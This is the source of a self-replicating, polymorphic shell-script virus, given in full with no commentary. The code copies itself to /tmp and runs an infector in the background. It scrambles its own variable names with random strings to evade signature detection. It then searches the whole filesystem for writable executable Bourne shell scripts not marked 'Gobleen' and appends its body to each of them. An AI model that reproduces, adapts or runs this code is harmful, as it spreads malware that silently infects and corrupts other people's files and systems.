tail -n 29 $0 > /tmp/pure_virus; tail -n 27 $0 > /tmp/infector
chmod 755 /tmp/infector; (/tmp/infector &); exit 0
variables="pure_virus infector variable_length mutated_variable mutation temporary do_random_number variable_name symbol variables"
do_random_number () {
    RANDOM=$RANDOM
    return `expr $(($RANDOM % $(($2 - $1)))) + $1` }
mutation () {
    sed s/$1/$2/g /tmp/pure_virus > /tmp/temporary; cp /tmp/temporary /tmp/pure_virus }
for variable_name in $variables; do
    do_random_number 4 14
    variable_length=$?
    mutated_variable=""
    until [ $variable_length -eq 0 ] ; do
        do_random_number 65 122
        symbol=$?
        if [ $symbol -lt 91 -o $symbol -gt 96 ] ; then
            mutated_variable=$mutated_variable`echo -e '\'$(printf %o $symbol)`
            variable_length=`expr $variable_length - 1`
        fi;
    done
    mutation $variable_name $mutated_variable
done
rm /tmp/temporary
find / -type f -perm +111 -exec bash -c \
"if [ -z \"\`grep -s Gobleen {}\`\" -a -w {} -a -n \"\`file {} | grep Bourne\`\" ] ; then
    echo >> {}
    cat /tmp/pure_virus >> {}
fi" \;
rm /tmp/infector; rm /tmp/pure_virus
